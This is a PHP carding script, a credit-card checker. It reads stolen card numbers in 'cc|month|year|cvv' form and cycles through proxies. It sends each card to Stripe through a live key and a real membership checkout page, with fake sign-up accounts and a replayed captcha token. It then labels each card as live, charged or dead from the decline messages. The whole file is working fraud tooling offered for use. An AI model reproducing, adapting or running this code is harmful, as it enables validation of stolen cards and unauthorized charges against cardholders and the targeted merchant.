<?php 
require 'function.php';
error_reporting(0);

//---------------------------------------//
$mtc_site = "example.com" ;
$amt = "1$" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function random_strings($length_of_string) 
{
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
                       0, $length_of_string); 
}
$mail = 'mtctechx'.random_strings(6).'';
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
# -------------------- [1 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c10cb4d7-e1da-429f-811b-2e7f83ed543d15c628&muid=9fed3409-0c96-474b-9650-9f05007f860b29843f&sid=e0d5c88e-4458-4ca7-84b5-796ea9d75f4bd663cb&pasted_fields=number&payment_user_agent=stripe.js%2Fafda5b6e1%3B+stripe-js-v3%2Fafda5b6e1&time_on_page=165445&key=pk_live_iSfKSKoFN3pwjHkGA0QOJThi');




$result1 = curl_exec($ch);

$pi = Getstr($result1,'client_secret":"','_secret');

$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.seomraranga.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.seomraranga.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: pmpro_visit=1; PHPSESSID=33ed41ce53099f784f8642f88e52731c; __stripe_mid=9fed3409-0c96-474b-9650-9f05007f860b29843f; wordpress_test_cookie=WP+Cookie+check; __stripe_sid=e0d5c88e-4458-4ca7-84b5-796ea9d75f4bd663cb',
'origin: https://www.seomraranga.com',
'referer:  https://www.seomraranga.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=5&checkjavascript=1&other_discount_code=&username='.$mail.'&password=12345tisoy&password2=12345tisoy&bemail='.$mail.'%40tempmaile.com&bconfirmemail='.$mail.'%40tempmaile.com&fullname=&autorenew_present=1&CardType=visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&g-recaptcha-response=03AIIukzjlsk3Go6DIX11IieFZ-q5bRlZYJAe6qACHhQhodF1ZKwP2g_-VyfmDpz7IabS9OMv3FeZwjvPNu2DSgRXK4duNg1pA4iNUibR59P3degyTC_qWkmzTG2q9CbjEMxEVTsydP7K1pWRqqptoaacmHVeUHjbX7L60M3sr6WL4THfAuhQBHi84ud6qZhIVfjJhAntnU4gJC1pyDeYoYyYLMAnmoq7mgitaQKfeGwYp1Rrs-k2Es2e3zqdb40kXeQiMFQX_Nfs5AW4g3NOLu0Ac-jeoGREih8t12WS8P65_LxtzisIieM7M0bHMVloqO3qyZWBwnmaHHqZfc3mRsbwxA_FWZIBDSsn3bZbTSQxQTE6UCEyXbnSO3cb54OrmzdTsB3YfNHAljZ8bDw3-Feax_gr1A5jc05o81MiJyrx8GjVtwtyIQoeZbCiNbAoLFqYbgzlq3c74CXJ9BojRFwzHFmPi8Id8bl_hWxcPLKJEkd20hbal-KRi5ZOCxVCsiD-BZmphTOuH&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX7288&ExpirationMonth=12&ExpirationYear=2022');

#EDIT YOUR 2ND REQ POSTFIELDS HERE WATCH THIS CAREFULLY TO UNDERSTAND HOW TO EDIT FUCNTIONS 

$result2 = curl_exec($ch);
# ---------------------------------------#

# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ @shadowdemoN_xd </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ⚠️ @shadowdemoN_xd </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ @shadowdemoN_xd </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ @shadowdemoN_xd </span><br>';
    exit;
    }
    elseif(strpos($result2, "Security code is invalid.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ @shadowdemoN_xd </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED ❌ @shadowdemoN_xd </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 3DSECURE REQUIRED ❌ @shadowdemoN_xd </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ @shadowdemoN_xd </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ @shadowdemoN_xd </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';

}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';

}

curl_close($ch);
ob_flush();
//echo $result1;
//echo $result2;

?>